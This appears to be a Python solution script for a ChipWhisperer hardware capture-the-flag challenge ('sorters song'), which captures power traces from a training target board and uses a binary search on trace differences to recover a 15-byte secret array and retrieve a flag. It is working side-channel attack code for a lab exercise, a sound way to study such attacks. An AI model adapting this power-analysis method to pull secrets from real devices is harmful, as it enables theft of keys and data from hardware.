import chipwhisperer as cw
import numpy as np
from tqdm import trange
import time

SCOPETYPE = 'CWNANO'
PLATFORM = 'CWNANO'
SS_VER = 'SS_VER_1_1'
FIRMWARE = '../../../challenges/set1/sortersSong-CWNANO.hex'
SAMPLE_SIZE = 700
ARRAY_LENGTH = 15

def setup():
    try:
        scope = cw.scope()
        if not scope.connectStatus:
            scope.con()
    except Exception:
        scope = cw.scope()

    prog = cw.programmers.STM32FProgrammer
    scope.default_setup()

    return scope, prog

def reset_target(scope):
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high_z'
    time.sleep(0.05)

def get_trace_8bit(target, scope, k, guess):
    payload = bytearray([1, guess & 0xff, 0, k])
    target.simpleserial_write('p', payload)
    target.simpleserial_read('r', 2)

    scope.arm()
    target.simpleserial_write('c', b'')
    target.simpleserial_read('r', 1)

    if scope.capture():
        return None

    return scope.get_last_trace()

def attack_byte_binary_search(target, scope, byte_index):
    # Get reference traces
    trace_ref = get_trace_8bit(target, scope, byte_index, 0)
    trace_max = get_trace_8bit(target, scope, byte_index, 255)

    if trace_ref is None or trace_max is None:
        print(f'failed to get reference traces for byte {byte_index}')
        return None

    # Calculate SAD baseline and threshold
    sad_baseline = int(np.sum(np.abs(trace_max - trace_ref)))
    sad_threshold = sad_baseline // 2

    # Binary search
    low = 0
    high = 255

    for _ in trange(8, desc=f'byte {byte_index}', leave=False):
        guess = (low + high) // 2

        trace_guess = get_trace_8bit(target, scope, byte_index, guess)
        if trace_guess is None:
            continue

        sad = int(np.sum(np.abs(trace_guess - trace_ref)))

        if sad > sad_threshold:
            high = guess - 1
        else:
            low = guess + 1

    return high

def main():
    print('=== sorters song - power analysis attack ===\n')

    scope, prog = setup()
    scope.adc.samples = SAMPLE_SIZE

    target_type = cw.targets.SimpleSerial2 if SS_VER == 'SS_VER_2_1' else cw.targets.SimpleSerial
    try:
        target = cw.target(scope, target_type)
    except Exception:
        scope = cw.scope()
        target = cw.target(scope, target_type)

    print('programming target...')
    cw.program_target(scope, prog, FIRMWARE)
    reset_target(scope)
    print('target running\n')

    # Initialize target
    target.simpleserial_write('x', b'')
    target.simpleserial_read('r', 1)

    # Attack each byte
    recovered = bytearray()

    for k in range(ARRAY_LENGTH):
        print(f'attacking byte {k}')
        secret_byte = attack_byte_binary_search(target, scope, k)

        if secret_byte is None:
            print(f'failed to recover byte {k}')
            break

        print(f'recovered byte {k}: {secret_byte}')
        recovered.append(secret_byte)

    print(f'\nfull array recovered: {list(recovered)}')

    # Retrieve flag
    if len(recovered) == ARRAY_LENGTH:
        print('\nattempting to retrieve flag...')
        target.simpleserial_write('a', recovered)
        response = target.simpleserial_read('r', 20, ack=False)

        if response:
            try:
                flag = response.decode('utf-8')
                print(f'response from target: {flag}')
                if 'thisisnotdaflag' not in flag.lower():
                    print('\n=== success! flag recovered ===')
                else:
                    print('\n>>> attack failed: incorrect array <<<')
            except Exception:
                print(f'raw response: {response}')
        else:
            print('no response from target')
    else:
        print(f'\nerror: only recovered {len(recovered)}/{ARRAY_LENGTH} bytes')

    print('\ndisconnecting...')
    try:
        scope.dis()
        target.dis()
    except Exception:
        pass

if __name__ == '__main__':
    main()
